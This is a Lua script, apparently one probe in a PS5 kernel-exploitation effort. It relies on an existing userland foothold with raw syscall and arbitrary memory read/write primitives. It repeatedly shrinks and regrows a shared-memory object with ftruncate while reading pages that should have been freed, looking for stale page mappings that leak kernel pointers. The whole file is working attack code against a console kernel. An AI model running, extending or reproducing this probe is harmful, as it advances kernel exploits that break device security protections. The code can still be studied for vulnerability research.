-- CRASH_CLASS: HIGH
-- PROBE 1100d: SHM ftruncate race — single-thread Lua interleave
--
-- Previous probes crashed due to memory.write_qword printing binary to stdout
-- during chain construction. This version avoids child threads entirely:
-- Lua calls ftruncate(SMALL), then immediately reads the boundary page,
-- then ftruncate(LARGE). The race is looser but tests the same vm_object path.
--
-- If ftruncate invalidates pages asynchronously (e.g. via TLB shootdown IPI),
-- a read between ftruncate and the shootdown hits a stale PTE.

print("=== PROBE 1100d: SHM FTRUNCATE SINGLE-THREAD ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function fmt(val)
    if val == nil then return "nil" end
    local h, l
    if type(val) == "table" and val.h then h = val.h; l = val.l
    else h = 0; l = N(val) end
    if h < 0 then h = h + 0x100000000 end
    if l < 0 then l = l + 0x100000000 end
    return string.format("0x%08X%08X", h, l)
end

local stub = syscall.pipe.fn_addr
local pid_val = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid_val)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid_val end

-- Create SHM object
local LARGE = 0x40000   -- 256KB = 16 PS5 pages
local SMALL = 0x4000    -- 16KB = 1 PS5 page

local sc482 = mk(482)
local sc480 = mk(480)
local sc477 = mk(477)

local shm_fd = N(sc482(uint64(1), uint64(0x602), uint64(0x1FF)))
print("shm_fd=" .. shm_fd)
if shm_fd < 0 then print("FAILED") return end

-- Size to LARGE and mmap
N(sc480(uint64(shm_fd), uint64(LARGE)))
local map = sc477(uint64(0), uint64(LARGE), uint64(3), uint64(1), uint64(shm_fd), uint64(0))
print("map=" .. fmt(map))

local map_n = N(map)
if map_n == 0 then print("mmap FAILED") return end

-- Write sentinels to all 16 pages
for p = 0, 15 do
    wd(map_n + p * 0x4000, 0xAA000000 + p)
    wd(map_n + p * 0x4000 + 4, 0xBB000000 + p)
end
print("sentinels written")

-- Race loop: ftruncate small -> read boundary -> ftruncate large -> read boundary
local ROUNDS = 500
local kptr_count = 0
local fault_count = 0
local anomaly_count = 0
local zero_count = 0
local read_count = 0

print(string.format("racing %d rounds...", ROUNDS))
for round = 1, ROUNDS do
    -- Shrink to 1 page
    N(sc480(uint64(shm_fd), uint64(SMALL)))

    -- Immediately read pages 1-3 (should be gone)
    for pg = 1, 3 do
        local off = pg * 0x4000
        local val = rq(uint64(map_n + off))
        read_count = read_count + 1
        if val == nil then
            fault_count = fault_count + 1
        else
            local h, l
            if type(val) == "table" and val.h then h = val.h; l = val.l
            else h = 0; l = N(val) end
            if h < 0 then h = h + 0x100000000 end
            if l < 0 then l = l + 0x100000000 end

            if h >= 0xFFFF8000 and h ~= 0xFFFFFFFF then
                kptr_count = kptr_count + 1
                if kptr_count <= 10 then
                    print(string.format("  [KPTR!] round %d pg %d: 0x%08X%08X", round, pg, h, l))
                end
            elseif h == 0 and l == 0 then
                zero_count = zero_count + 1
            else
                local expected = 0xAA000000 + pg
                if l ~= expected then
                    anomaly_count = anomaly_count + 1
                    if anomaly_count <= 10 then
                        print(string.format("  [ANOM] round %d pg %d: 0x%08X%08X", round, pg, h, l))
                    end
                end
            end
        end
    end

    -- Grow back to full
    N(sc480(uint64(shm_fd), uint64(LARGE)))

    -- Re-read (should be back, possibly zeroed)
    for pg = 1, 3 do
        local off = pg * 0x4000
        local val = rq(uint64(map_n + off))
        read_count = read_count + 1
        if val == nil then
            fault_count = fault_count + 1
        else
            local h, l
            if type(val) == "table" and val.h then h = val.h; l = val.l
            else h = 0; l = N(val) end
            if h < 0 then h = h + 0x100000000 end
            if l < 0 then l = l + 0x100000000 end

            if h >= 0xFFFF8000 and h ~= 0xFFFFFFFF then
                kptr_count = kptr_count + 1
                if kptr_count <= 10 then
                    print(string.format("  [KPTR!] round %d pg %d (after grow): 0x%08X%08X", round, pg, h, l))
                end
            elseif h == 0 and l == 0 then
                zero_count = zero_count + 1
            end
        end
    end

    -- Re-write sentinels for next round
    for p = 1, 3 do
        wd(map_n + p * 0x4000, 0xAA000000 + p)
        wd(map_n + p * 0x4000 + 4, 0xBB000000 + p)
    end
end

print("")
print(string.format("reads=%d faults=%d kptrs=%d anomalies=%d zeros=%d",
    read_count, fault_count, kptr_count, anomaly_count, zero_count))
print("alive=" .. tostring(alive()))
print("")
print("=== PROBE 1100d COMPLETE ===")
